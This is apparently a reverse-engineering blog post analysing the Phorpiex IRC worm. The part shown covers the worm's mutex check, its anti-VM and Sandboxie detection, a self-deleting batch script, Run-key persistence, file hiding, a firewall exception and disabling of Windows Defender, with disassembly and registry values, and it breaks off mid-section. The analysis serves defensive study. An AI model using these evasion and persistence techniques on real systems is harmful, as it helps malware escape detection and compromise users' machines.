<!doctype html><html lang="en-US"><head><link href="/assets/fonts/Montserrat-VariableFont_wght.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""><meta charset="utf-8"><meta content="IE=edge" http-equiv="X-UA-Compatible"><title>Phorpiex - An IRC worm - Full reversal for the fun of it</title><meta content="Phorpiex is a worm controlled over IRC. It can be instructed to do mainly three things: (1) download and run other executables, including the possibility to update itself; (2) to brute-force SMTP credentials by checking popular login/password combinations on a downloaded list of servers; (3) to spread executables &amp;mdash; be it Phorpiex or any other malware &amp;mdash; by email." name="description" property="og:description"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="en_US" property="og:locale"><meta content="./assets/img/front/bots-800.jpeg" property="og:image"><meta content="website" property="og:type"><meta content="Binary Reverse Engineering Blog" property="og:site_name"><meta content="Phorpiex - An IRC worm - Full reversal for the fun of it" property="og:title"><meta content="summary" name="twitter:card"><meta content="@viql" name="twitter:site"><meta content="@viql" name="twitter:creator"><meta content="Phorpiex - An IRC worm - Full reversal for the fun of it" name="twitter:title"><meta content="Phorpiex is a worm controlled over IRC. It can be instructed to do mainly three things: (1) download and run other executables, including the possibility to update itself; (2) to brute-force SMTP credentials by checking popular login/password combinations on a downloaded list of servers; (3) to spread executables &amp;mdash; be it Phorpiex or any other malware &amp;mdash; by email." name="twitter:description"><meta content="https://bin.re/assets/img/front/bots-800.jpeg" name="twitter:image"><link href="/assets/css/common-ef2fe0.css" rel="stylesheet"><link href="feed.xml" rel="alternate" type="application/atom+xml" title="Atom feed for the Blog"><link href="/assets/css/blog-a83391.css" rel="stylesheet"><link href="/apple-touch-icon-60x60.png" rel="apple-touch-icon" sizes="60x60"><link href="/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76"><link href="/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120"><link href="/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152"><link href="/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180"><link href="/apple-touch-icon-192x192.png" rel="apple-touch-icon" sizes="192x192"><link href="/apple-touch-icon-512x512.png" rel="apple-touch-icon" sizes="512x512"><link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"><link href="/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"><link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"><link href="/favicon.ico" rel="shortcut icon"><noscript><style>img.lazyload {
          display: none;
        }</style></noscript><script defer src="/assets/js/all.min-a1c570.js"></script></head><body class="a b7"><div class="b"><div class="d"><div class="f e"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-close" xlink:href="/assets/svg/icons.svg#icon-close"></use></svg></div><div class="h"><ul class="i j sidebar"><li class="q r"><a href="/">Home</a></li><li class="q"><a href="/publications/">Publications</a></li><li class="q t"><span class="u">Projects<svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-angle-down" xlink:href="/assets/svg/icons.svg#icon-angle-down"></use></svg></span><ul class="v"><li><a href="/projects/risk-battle-outcomes/">Probability of Winning Battles in Risk</a></li><li><a href="/tag/project-euler/">Project Euler</a></li><li><a href="/projects/bazarbackdoor/">BazarBackdoor Tools</a></li></ul></li><li class="q t"><span class="u">Reverse Engineering<svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-angle-down" xlink:href="/assets/svg/icons.svg#icon-angle-down"></use></svg></span><ul class="v"><li><a href="/tag/malware-analysis/">Malware Analysis</a></li><li><a href="/projects/solutions-to-crackmes/">Solutions to Crackmes</a></li><li><a href="/projects/solutions-to-practical-reverse-engineering/">Solutions to "Practical Reverse Engineering"</a></li></ul></li></ul></div></div></div><div id="aw"><div class="w"><header class="y x"><nav class="z a0"><a href="/"><span class="a1"><!-- Generator: Adobe Illustrator 25.0.0, SVG Export Plug-In  --> <svg viewBox="0 0 86.4 20.21" height="20.21px" style="overflow:visible;enable-background:new 0 0 86.4 20.21;" version="1.1" width="86.4px" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px"><g><path class="a2" d="M28.56,5.13c-1.99,0-2.87-1.12-2.87-2.57c0-1.5,0.9-2.57,2.87-2.57c2.02,0,2.95,1.07,2.95,2.57
    C31.51,4.01,30.58,5.13,28.56,5.13z M25.96,19.94V6.47h5.22v13.46H25.96z"></path><path class="a2" d="M43.69,19.94v-7.92c0-1.23-0.27-1.91-1.59-1.91c-0.6,0-1.53,0.3-2.24,0.76v9.07H34.6V6.45h4.89l0.08,1.31
    l0.16,0.05c1.58-1.12,3.5-1.69,4.78-1.69c3.47,0,4.42,1.91,4.42,4.86v8.96H43.69z"></path><path class="a2" d="M54.33,20.15c-1.83,0-2.62-1.01-2.62-2.37c0-1.37,0.82-2.35,2.62-2.35c1.86,0,2.68,0.98,2.68,2.35
    C57,19.14,56.16,20.15,54.33,20.15z"></path><path class="a2" d="M65.14,9.23c1.58-1.69,3.85-3.17,5.49-3.17c0.63,0,0.79,0.49,0.79,1.09c0,1.45-0.87,4.29-1.58,5.3l-4.51-0.57
    v8.06h-5.21V6.45h5.16c0,0.66-0.14,2.08-0.25,2.7L65.14,9.23z"></path><path class="a2" d="M86.4,12.78v1.2h-8.63c0.03,1.72,1.07,2.4,3.03,2.4c1.34,0,3-0.35,4.34-0.76l0.98,3.2
    c-1.94,1.04-4.34,1.39-6.25,1.39c-5.9,0-7.32-3.33-7.32-6.99c0-3.41,1.58-7.13,7.07-7.13C85.74,6.09,86.4,9.78,86.4,12.78z
     M77.82,11.52h3.9c-0.03-1.31-0.41-2.29-1.83-2.29C78.4,9.23,77.93,10.32,77.82,11.52z"></path><path class="a2" d="M6.92,12.81"></path><path class="a2" d="M17.24,6.06c-0.79,0-2.43,0.29-3.87,1.3c0-0.14-0.06-2.69-0.06-3.07V0.27H8.12v9.28
    c2.71-0.69,4.54-1.87,5.24-2.18v3.06c-0.85,0.55-4.15,2.11-5.24,2.44v5.86c2.62,1.28,6.12,1.48,7.54,1.48
    c5.79,0,7.16-3.33,7.16-7.02C22.82,9.07,21.45,6.06,17.24,6.06z M15.41,16.6c-0.54,0-1.31-0.08-2.05-0.38v-5.79
    c0.66-0.33,1.45-0.65,2.16-0.65c1.01,0,2.1,0.35,2.1,3.47C17.63,16.14,16.59,16.6,15.41,16.6z"></path><path class="a2" d="M8.12,9.55c-1.03,0.23-2.56,0.51-3.66,0.23l0-3.09L0,11.57l4.51,4.88l0-3.13c1.38,0.17,2.69-0.23,3.61-0.45
    V9.55z"></path></g></svg></span></a><div class="a3"><button class="a2 a4" id="ax"><svg height="20px" version="1.1" width="20px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewport="0 0 20 20"><path class="a5" d="M2.28,15.89l1.57-1.61l1.24,1.24l-1.57,1.61L2.28,15.89z M8.86,19.33v-2.61h1.74v2.61H8.86z M9.73,4.35
	c1.46,0,2.71,0.52,3.75,1.55s1.55,2.28,1.55,3.75s-0.52,2.71-1.55,3.75c-1.03,1.03-2.28,1.55-3.75,1.55s-2.71-0.52-3.75-1.55
	s-1.55-2.28-1.55-3.75S4.95,6.93,5.98,5.9S8.26,4.35,9.73,4.35z M16.81,8.77h2.65v1.78h-2.65V8.77z M14.36,15.52l1.24-1.2l1.57,1.57
	l-1.24,1.24L14.36,15.52z M17.18,3.43l-1.57,1.57l-1.24-1.24l1.57-1.57L17.18,3.43z M10.6,0v2.61H8.86V0C8.86,0,10.6,0,10.6,0z
	 M2.65,8.77v1.78H0V8.77H2.65z M5.09,3.77L3.85,5.01L2.28,3.43l1.24-1.24L5.09,3.77z"></path><path class="a6" d="M14.18,14.19c3.31-3.31,3.31-8.67,0-11.97C13.06,1.1,11.7,0.36,10.26,0c2.2,2.88,1.98,7.01-0.65,9.65
	C6.99,12.26,2.88,12.49,0,10.33c0.37,1.41,1.1,2.76,2.21,3.87C5.52,17.5,10.88,17.5,14.18,14.19z M7.1,2.48H6.36l0.52,0.52
	L6.55,3.34L6.03,2.81v0.74H5.56V2.81L5.04,3.34L4.71,3.01l0.52-0.52H4.49V2.02h0.74L4.71,1.49l0.33-0.33l0.52,0.52V0.95h0.47v0.74
	l0.52-0.52l0.33,0.33L6.36,2.02H7.1V2.48z M0.94,3.94c0,0.26-0.21,0.47-0.47,0.47S0,4.2,0,3.94s0.21-0.47,0.47-0.47
	S0.94,3.68,0.94,3.94z M3.88,5.66c0,0.29-0.24,0.53-0.53,0.53S2.83,5.95,2.83,5.66c0-0.29,0.24-0.53,0.53-0.53S3.88,5.36,3.88,5.66z
	"></path></svg></button><ul class="i j a7"><li class="q"><a href="/">Home</a></li><li class="q"><a href="/publications/">Publications</a></li><li class="q t"><span class="u">Projects<svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-angle-down" xlink:href="/assets/svg/icons.svg#icon-angle-down"></use></svg></span><ul class="v"><li><a href="/projects/risk-battle-outcomes/">Probability of Winning Battles in Risk</a></li><li><a href="/tag/project-euler/">Project Euler</a></li><li><a href="/projects/bazarbackdoor/">BazarBackdoor Tools</a></li></ul></li><li class="q t r"><span class="u">Reverse Engineering<svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-angle-down" xlink:href="/assets/svg/icons.svg#icon-angle-down"></use></svg></span><ul class="v"><li><a href="/tag/malware-analysis/">Malware Analysis</a></li><li><a href="/projects/solutions-to-crackmes/">Solutions to Crackmes</a></li><li><a href="/projects/solutions-to-practical-reverse-engineering/">Solutions to "Practical Reverse Engineering"</a></li></ul></li></ul><div class="f a8 a9"><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-bars" xlink:href="/assets/svg/icons.svg#icon-bars"></use></svg></div></div></nav></header><div class="b8"><noscript>&lt;img src="/assets/img/header/bots-640.jpeg" class="-minfy-post__title-image"/&gt;</noscript><img alt="cover image for post 'Phorpiex - An IRC worm'" class="lazyload b9" data-src="/assets/img/header/bots-640.jpeg" data-srcset="/assets/img/header/bots-640.webp 640w" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMjMzIj48cGF0aCBmaWxsPSIjNTM1MTRmIiBkPSJNMCAwaDMwMHYyMzNIMHoiLz48ZyBmaWxsLW9wYWNpdHk9Ii41IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSguNiAuNilzY2FsZSgxLjE3MTg4KSI+PGNpcmNsZSBjeD0iMTU5IiBjeT0iNTQiIHI9IjIyNSIgZmlsbD0iI2ZmZiIvPjxwYXRoIGZpbGw9IiNmZmZkZmIiIGQ9Im0yNTgtMTYtNyAxMDBMLTE2IDJ6Ii8+PHBhdGggZmlsbD0iI2E0NDU0MCIgZD0iTTY3IDEyOGgxNTh2NThINjd6Ii8+PGVsbGlwc2UgY3g9IjQwIiBjeT0iMTc0IiBmaWxsPSIjZmZmIiByeD0iMjAiIHJ5PSI3NSIvPjxjaXJjbGUgcj0iMSIgZmlsbD0iI2ZmZiIgdHJhbnNmb3JtPSJtYXRyaXgoLTEuNzgyNzkgLTMzLjIzNTUzIDE3LjIzNjQ0IC0uOTI0NTggMTY5LjMgMTEwLjMpIi8+PGNpcmNsZSByPSIxIiBmaWxsPSIjYTc2MTVjIiB0cmFuc2Zvcm09Im1hdHJpeCgxNS43MTY3NSAtMi42OTY1NyAxMi4xMDM1NSA3MC41NDQ3MyAxOTAgNzApIi8+PHBhdGggZmlsbD0iIzFjMTIwZCIgZD0ibTE2NiAxNDggNDEgMjUtNzUgMjl6Ii8+PHBhdGggZmlsbD0iIzAyMDQwMSIgZD0iTTYxIDE4NWg0MXYxNEg2MXoiLz48ZWxsaXBzZSBjeD0iMjMxIiBjeT0iMzIiIGZpbGw9IiNmZmYiIHJ4PSIyMiIgcnk9IjkwIi8+PGNpcmNsZSByPSIxIiBmaWxsPSIjZmYzMjJhIiB0cmFuc2Zvcm09InJvdGF0ZSgtNC43IDEyNDguNSAtOTMyKXNjYWxlKDMxLjY1MzQ2IDEwLjQ0MTkzKSIvPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHg9Ii0uNSIgeT0iLS41IiBmaWxsPSIjZmZmIiB0cmFuc2Zvcm09Im1hdHJpeCgtNDYuMTI2ODggLTI5Ljk1NTE1IDIxLjc4NTU2IC0zMy41NDY4MiAyNDggMTk4KSIvPjxlbGxpcHNlIGN4PSI2MSIgY3k9IjQ0IiBmaWxsPSIjZWFhOWE1IiByeD0iODUiIHJ5PSIzMSIvPjxjaXJjbGUgcj0iMSIgZmlsbD0iI2ZjNWQ1NyIgdHJhbnNmb3JtPSJtYXRyaXgoNjEuNjYyMTQgLTkuODc2NjcgMS45NjgyNCAxMi4yODgxNCAyMzMuNCAxMzQuOCkiLz48ZWxsaXBzZSBjeD0iNDciIGZpbGw9IiNmZmYiIHJ4PSIyMyIgcnk9IjU0Ii8+PHBhdGggZmlsbD0iIzIzMjAxZCIgZD0ibS0xNiAxODAgNDEtMy03LTIyeiIvPjxwYXRoIGZpbGw9IiNmM2ZmZmYiIGQ9Im05NiAxNzAgMTgtMjAtNCA2NHoiLz48cGF0aCBmaWxsPSIjZGU1ZDU2IiBkPSJtMTY5IDg3IDMyIDE4IDcwLTQxeiIvPjxwYXRoIGZpbGw9IiNmZjc0NmQiIGQ9Im0xMTMgODcuOC00LjQtMTcuNSA4MC41LTIwIDQuMyAxNy40eiIvPjxjaXJjbGUgcj0iMSIgZmlsbD0iI2ZmZiIgdHJhbnNmb3JtPSJtYXRyaXgoLTQwLjk5NzQgMTcuMzQxNzcgLTYuMDU0ODkgLTE0LjMxNDI2IDIzLjggMTkzKSIvPjxjaXJjbGUgcj0iMSIgZmlsbD0iI2UzNDMzYyIgdHJhbnNmb3JtPSJtYXRyaXgoLTMuMTU3MzcgLTExLjczMzk4IDIxLjYzMzY1IC01LjgyMTE2IDE0LjIgMTM0LjIpIi8+PHBhdGggZmlsbD0iI2U3NWU1OCIgZD0ibTgxLjggMTczLjIgODYuMS00My41LTE0MS42IDIzLjQtNDIuMy0xNy41eiIvPjxwYXRoIGZpbGw9IiM1NTNkMzkiIGQ9Im03Ni41IDEwMSAzLjEtMzguNy0xMi4zIDcgMyAxNDQuN3oiLz48cGF0aCBmaWxsPSIjZmZmNmY0IiBkPSJtMTEyLjIgMTM2LjMgMTEuNC00OC41LTE3LjctMzEuMi0xMC43LTYuNHoiLz48cGF0aCBmaWxsPSIjZmZmIiBkPSJtMTU2IDY5LTU0LTg1aDYzeiIvPjxlbGxpcHNlIGN4PSIzMSIgY3k9IjY0IiBmaWxsPSIjZTQ0NDNkIiByeD0iMjciIHJ5PSIxMCIvPjxwYXRoIGZpbGw9IiNmZmU3ZTciIGQ9Im0xNTIgMTY1IDQ3LTY1LTU0IDEzeiIvPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0xMiAxMDRoMzN2MThIMTJ6bTEyNi44IDEwNS40LTMxLjkgMi4yLTEuNy0yNSAzMS45LTIuMnoiLz48cGF0aCBmaWxsPSIjMTk0MTQwIiBkPSJtMTA5LjcgMTcyLjcgNDgtMTAuMiAyLjYgMTIuOC00OCAxMC4yeiIvPjxwYXRoIGZpbGw9IiNmMzQ5NDQiIGQ9Ik0xMDMgMTMwaDYydjE2aC02MnoiLz48L2c+PC9zdmc+"></div><main class="y aa"><article class="z ae ac ba"><div class="bb"><h1 class="bc">Phorpiex - An IRC worm</h1><span class="bo">Full reversal for the fun of it</span></div><div class="bd"><ul class="i be"><li><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-calendar-o" xlink:href="/assets/svg/icons.svg#icon-calendar-o"></use></svg> <a href="https://bin.re/2016/02">February 21, 2016</a></li><li><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-book" xlink:href="/assets/svg/icons.svg#icon-book"></use></svg> <a href="/category/reverse-engineering">reverse engineering</a></li><li><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-tags" xlink:href="/assets/svg/icons.svg#icon-tags"></use></svg> <span class="bf"><a href="/tag/malware-analysis" class="bg">malware analysis</a></span></li><li><svg viewBox="0 0 35 32" class="g"><use href="/assets/svg/icons.svg#icon-comments-o" xlink:href="/assets/svg/icons.svg#icon-comments-o"></use></svg> <a href="#comments">2 comments</a></li></ul><div class="bh"><span class="bj">Table of Contents</span><ul class="i bk"><li><a href="#initialization">Initialization</a></li><li><a href="#prerequisites">Prerequisites</a></li><li><a href="#mutex">Mutex</a></li><li><a href="#anti-vm">Anti-VM</a></li><li><a href="#ZgotmplZ">Technique 1: Storage Device Property Product ID</a></li><li><a href="#sandboxie">Sandboxie</a></li><li><a href="#quitting">Quitting</a></li><li><a href="#persistence">Persistence</a></li><li><a href="#zone-identifier">Zone Identifier</a></li><li><a href="#placement">Placement</a></li><li><a href="#autostart">Autostart</a></li><li><a href="#hiding">Hiding</a></li><li><a href="#circumventing-security">Circumventing Security</a></li><li><a href="#windows-firewall">Windows Firewall</a></li><li><a href="#windows-defender">Windows Defender</a></li><li><a href="#cleanup">Cleanup</a></li><li><a href="#candc-communication">C&amp;C Communication</a></li><li><a href="#main-loop">Main Loop</a></li><li><a href="#id-string">ID String</a></li><li><a href="#client-messages">Client Messages</a></li><li><a href="#nick">NICK</a></li><li><a href="#user">USER</a></li><li><a href="#privmsg">PRIVMSG</a></li><li><a href="#pong">PONG</a></li><li><a href="#join">JOIN</a></li><li><a href="#server-messages">Server Messages</a></li><li><a href="#%28any-message-that-contains-%22001%22%29">(Any Message That Contains "001")</a></li><li><a href="#ping">PING</a></li><li><a href="#443">443</a></li><li><a href="#privmsg">PRIVMSG</a></li><li><a href="#322">322</a></li><li><a href="#tasks">Tasks</a></li><li><a href="#bye-quit">bye - Quit</a></li><li><a href="#moff-stop-all-mailing-tasks">m.off - Stop all Mailing Tasks</a></li><li><a href="#boff-stop-brute-forcing">b.off - Stop Brute Forcing</a></li><li><a href="#j-join-channel">j - Join channel</a></li><li><a href="#b-brute-force-smtp-accounts">b - Brute-Force SMTP Accounts</a></li><li><a href="#d-download-executable">d - Download Executable</a></li><li><a href="#x-execute">x - Execute</a></li><li><a href="#u-update">u - Update</a></li><li><a href="#a-match-against-all-country-codes">a - Match against all Country Codes</a></li><li><a href="#p-match-against-partial-country-codes">p - Match against partial Country Codes</a></li><li><a href="#lessabbr_country-match-against-provided-country">&lt;abbr_country - Match against provided Country</a></li><li><a href="#ms-mail-exe-with-server-list">m.s - Mail Exe with Server List</a></li><li><a href="#mailing-thread">Mailing Thread</a></li><li><a href="#mail">Mail</a></li><li><a href="#mx-mail-exe-without-server-list">m.x - Mail Exe without Server List</a></li><li><a href="#rc4-implementation">RC4 Implementation</a></li><li><a href="#iocs">IOCs</a></li></ul><span class="bj">Aliases</span><p>The malware in this blog post is also known as <span class="bl">Phorpiex</span> and <span class="bl">Trik</span></p><div><span class="bj">Malpedia</span><p>For more information about the malware in this blog post see the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.phorpiex" class="bm">Malpedia entry on Phorpiex</a>.</p></div></div></div><div class="b6 bi"><p>Phorpiex is a worm controlled over IRC. It can be instructed to do mainly three things: (1) download and run other executables, including the possibility to update itself; (2) to brute-force SMTP credentials by checking popular login/password combinations on a downloaded list of servers; (3) to spread executables — be it Phorpiex or any other malware — by email.</p><p>The IRC worm Phorpiex does not seem to be very widespread at the moment, nor is it particularly sophisticated. Nevertheless I still did a complete code analysis of a Phorpiex sample the past weekend, because it is very pleasant and fun to reverse engineer:</p><ul><li>Phorpiex is written very cleanly. Some parts are most likely written in assembler.</li><li>There is a nice <a href="#anti-vm">Anti-VM</a> technique to get past. After that, there are no anti-reversing or anti-debugging measures that lessen the pleasure of reversing.</li><li>Phorpiex uses very few library calls. For example, the IRC and SMTP protocol are partially implemented with only using windows socket calls for networking.</li></ul><p>I reversed the following sample:</p><dl><dt>md5</dt><dd>c753d418655a2c4570dc421105e1bbf0</dd><dt>sha256</dt><dd>7fb1664da6247b7d37ffd2f8a5c8151ca5e93733732647804e383f670113088a</dd><dt>size</dt><dd>856'576 bytes</dd><dt>scan date</dt><dd>2016-02-09 11:03</dd><dt>analysis</dt><dd><a href="https://malwr.com/analysis/NDY3YzY3MWYyY2JlNGM0N2EyZjNhNjEyMTEyZTg5Y2I/">link</a></dd></dl><p>Unpacking, which is not covered in this blog post, lead to the following binary:</p><dl><dt>md5</dt><dd>2a6fab4cfce55c3815fc80607797afd0</dd><dt>sha256</dt><dd>b45c7ac7e1b7bbc32944c01be58d496b5e765a90bd4b1026855dd44cea28cd12</dd><dt>size</dt><dd>131'072 bytes</dd><dt>scan data</dt><dd>2016-02-11 13:00</dd><dt>analysis</dt><dd><a href="https://www.virustotal.com/en/file/b45c7ac7e1b7bbc32944c01be58d496b5e765a90bd4b1026855dd44cea28cd12/analysis/1455195636/">link</a></dd></dl><p>This blog post is mostly an embellishment of my research log. I’m well aware that the post should be better researched, organized and written; but then again I looked at Phorpiex for the sake of reverse engineering, and do not think there is any need for more documentation in the first place.</p><h2 id="initialization">Initialization</h2><p>This section describes the steps Phorpiex takes before listening for commands.</p><h3 id="prerequisites">Prerequisites</h3><h4 id="mutex">Mutex</h4><p>Phorpiex checks for other concurrent instances with mutex <code>w6</code>. If the mutex already exists, the malware exits.</p><h4 id="anti-vm">Anti-VM</h4><p>The malware uses two anti-VM techniques. The first targets Virtual Box, VMware, QEMU and potentially other products. The second targets Sandboxie.</p><h5 id="technique-1-storage-device-property-product-id">Technique 1: Storage Device Property Product ID</h5><p>This anti-VM technique reads the product ID of the first storage device and checks if the ID contains one of three blacklisted strings.</p><ol><li><p>Open a handle to the first physical disk using <code>CreateFileA</code> on <code>\\.\PhysicalDrive0</code></p><pre><code> 011D1043 push    0               ; hTemplateFile
 011D1045 push    0               ; dwFlagsAndAttributes
 011D1047 push    3               ; dwCreationDisposition
 011D1049 push    0               ; lpSecurityAttributes
 011D104B push    3               ; dwShareMode
 011D104D push    0               ; dwDesiredAccess
 011D104F push    offset first_drive ; "\\.\\PhysicalDrive0"
 011D1054 call    ds:CreateFileA
 011D105A mov     [ebp+hDevice], eax
</code></pre></li><li><p>Send the control code 0x2D1400 (2954240) to the device. This IOCTL stands for <code>IOCTL_STORAGE_QUERY_PROPERTY</code> and returns <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ff800830(v=vs.85).aspx">the properties of the storage device</a>. The properties are returned in a <code>STORAGE_DEVICE_DESCRIPTOR</code> structure.</p><pre><code> 011D108A mov     [ebp+storage_query_property_inbuffer], 0
 011D1094 push    80h                             
 011D1099 push    0                               
 011D109B lea     ecx, [ebp+storage_query_property_out]
 011D10A1 push    ecx                             
 011D10A2 call    memset
 011D10A7 add     esp, 0Ch
 011D10AA push    80h                             
 011D10AF push    0                               
 011D10B1 lea     edx, [ebp+product_id]
 011D10B7 push    edx                             
 011D10B8 call    memset
 011D10BD add     esp, 0Ch
 011D10C0 push    0                               
 011D10C2 lea     eax, [ebp+BytesReturned]
 011D10C8 push    eax                             
 011D10C9 push    80h                             
 011D10CE lea     ecx, [ebp+storage_query_property_out]
 011D10D4 push    ecx                             
 011D10D5 push    0Ch                             
 011D10D7 lea     edx, [ebp+storage_query_property_inbuffer]
 011D10DD push    edx                             
 011D10DE push    2D1400h                         
 011D10E3 mov     eax, [ebp+hDevice]
 011D10E9 push    eax                             
 011D10EA call    ds:DeviceIoControl
</code></pre></li><li><p>Retrieve the device’s product ID from the <code>STORAGE_DEVICE_DESCRIPTOR</code>:</p><pre><code> 011D10F8 lea     ecx, [ebp+storage_query_property_out]
 011D10FE mov     [ebp+storage_query_property_out_], ecx
 011D1104 mov     edx, [ebp+storage_query_property_out_]
 011D110A mov     eax, [edx+STORAGE_DEVICE_DESCRIPTOR.ProductIdOffset]
 011D110D mov     [ebp+product_id_offset], eax
 011D1113 mov     [ebp+index], 0
 011D111D mov     ecx, [ebp+product_id_offset]
 011D1123 mov     [ebp+product_id_offset_], ecx
 011D1129 jmp     short loc_11D113A
 011D112B 
 011D112B
 011D112B loc_11D112B:                            
 011D112B mov     edx, [ebp+product_id_offset_]
 011D1131 add     edx, 1
 011D1134 mov     [ebp+product_id_offset_], edx
 011D113A
 011D113A loc_11D113A:                            
 011D113A mov     eax, [ebp+product_id_offset_]
 011D1140 movsx   ecx, [ebp+eax+storage_query_property_out]
 011D1148 test    ecx, ecx
 011D114A jz      short loc_11D1177
 011D114C mov     edx, [ebp+index]
 011D1152 mov     eax, [ebp+product_id_offset_]
 011D1158 mov     cl, [ebp+eax+storage_query_property_out]
 011D115F mov     [ebp+edx+product_id], cl
 011D1166 mov     edx, [ebp+index]
 011D116C add     edx, 1
 011D116F mov     [ebp+index], edx
 011D1175 jmp     short loc_11D112B
</code></pre><p>On VMware Workstation 12.0, this returned <em>“VMware Virtual S”</em> for me.</p></li><li><p>Search the following three strings, case-insensitively, inside the device ID:</p><ul><li>qemu</li><li>virtual</li><li>vmware</li></ul><p>So <code>VMware Virtual S</code> would get flagged against <code>virtual</code> and <code>vmware</code>. The VM is busted if at least one of the three strings matches.</p></li></ol><h5 id="sandboxie">Sandboxie</h5><p>The second VM detection routine targets <a href="http://www.sandboxie.com/">Sandboxie</a>. Sandboxie is indentified by two DLLs:</p><ul><li><code>SbieDll.dll</code></li><li><code>SbieDllX.dll</code></li></ul><p>If any of those two can be loaded with <code>GetModuleHandleA</code> then Sandboxie is considered running:</p><pre><code>.text:012461F9 push    offset sandboxie_dll2           ; "SbieDllX.dll"
.text:012461FE call    ds:GetModuleHandleA
.text:01246204 test    eax, eax
.text:01246206 jz      short passed
</code></pre><h5 id="quitting">Quitting</h5><p>If either of the two VM detection routines triggers the malware quits. Before exiting, it first creates a batch script in the temp folder whose name has ten random letters, e.g., on Windows 7:</p><pre><code>C:\Users\&lt;USERNAME&gt;\AppData\Local\Temp\&lt;10 RND LETTERS&gt;.bat
</code></pre><p>The bat script tries to delete the malware executable in an infinite loop. The script deletes itself after the executable is gone:</p><pre><code>:repeat
del &lt;PATH_TO_EXE&gt; 
if exist &lt;PATH_TO_EXE&gt; goto repeat
del &lt;PATH_TO_THIS_BAT&gt; 
</code></pre><h3 id="persistence">Persistence</h3><p>If the Mutex did not exist yet and the anti-VM did not trigger, then Phorpiex moves on to establish persistence.</p><h4 id="zone-identifier">Zone Identifier</h4><p>First the Zone Identifier is stripped if present (usually when downloading the file through browsers):</p><pre><code>009E6255 lea     ecx, [ebp+this_path]
009E625B push    ecx
009E625C push    offset aSZone_identifi ; "%s:Zone.Identifier"
009E6261 push    104h            ; Count
009E6266 lea     edx, [ebp+zone_identifier_stream]
009E626C push    edx             ; Dest
009E626D call    _snprintf
009E6272 add     esp, 10h
009E6275 lea     eax, [ebp+zone_identifier_stream]
009E627B push    eax             ; lpFileName
009E627C call    ds:DeleteFileA  ; delete the zone.identifier s
</code></pre><h4 id="placement">Placement</h4><p>The malware settles in one of the following three directories, testing them one after another:</p><ul><li><code>%windir%</code></li><li><code>%userprofile%</code></li><li><code>%temp%</code></li></ul><p>The malware tries to create a hardcoded subdirectory in those environments, in my sample <code>M-50504503224255244048500220524542045</code>. On Windows 7 with user priviliges, this should fail for <code>%windir%</code>, and be successful for <code>%userprofile%</code>. The malware copies the executable to the subdirectory under a hard-coded name, for my sample <code>winsvc.exe</code>. For example:</p><pre><code>C:\Users\&lt;USERNAME&gt;\M-50504503224255244048500220524542045\winsvc.exe
</code></pre><p>The malware then checks if it was running from the destination path in the first place, meaning it must have established persistence in a previous run. If that is the case, Phorpiex skips to its normal operation described in Section <a href="#cc-communication">C&amp;C Communication</a>.</p><h4 id="autostart">Autostart</h4><p>The malware path is stored under the value name <code>Microsoft Windows Service</code> at <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\</code>. This will launch the malware on reboot.</p><pre><code>003D6534 lea     eax, [ebp+target_path]
003D653A push    eax             
003D653B push    1               
003D653D push    0               
003D653F push    offset Microsoft_Windows_Service 
003D6544 mov     ecx, [ebp+phkResult]
003D654A push    ecx             
003D654B call    ds:RegSetValueExA
</code></pre><h4 id="hiding">Hiding</h4><p>The malware hides both the executable and the parent directory by marking them a hidden and read-only system directory/file:</p><pre><code>003D642A push    7               ; system | readonly | hidden
003D642C lea     eax, [ebp+target_dir]
003D6432 push    eax             ; lpFileName
003D6433 call    ds:SetFileAttributesA
003D6439 push    7               ; dwFileAttributes
003D643B lea     ecx, [ebp+target_path]
003D6441 push    ecx             ; lpFileName
003D6442 call    ds:SetFileAttri
</code></pre><h3 id="circumventing-security">Circumventing Security</h3><p>Phorpiex circumvents both Windows’s Firewall and Defender.</p><h4 id="windows-firewall">Windows Firewall</h4><p>The malware adds itself to the list of programs allowed through Windows’s firewall. This list is kept under the registry key:</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\--&gt;
Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List
</code></pre><p>Phorpiex adds the value <code>&lt;TARGET&gt;:*:Enabled:Microsoft Windows Service</code> to this key, for example:</p><pre><code>C:\Users\&lt;USER&gt;\M-50504503224255244048500220524542045\winsvc.exe:*:Enabled:Microsoft Windows Service
</code></pre><h4 id="windows-defender">Windows Defender</h4><p>If present, Phorpiex disables the Windows Defender service. The service is disabled by writing the <code>DWORD</code> 4 (disabled) to this key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\WinDefend\</code>:</p><pre><code>003663E5 mov     dword ptr [ebp+pDisabled], 4
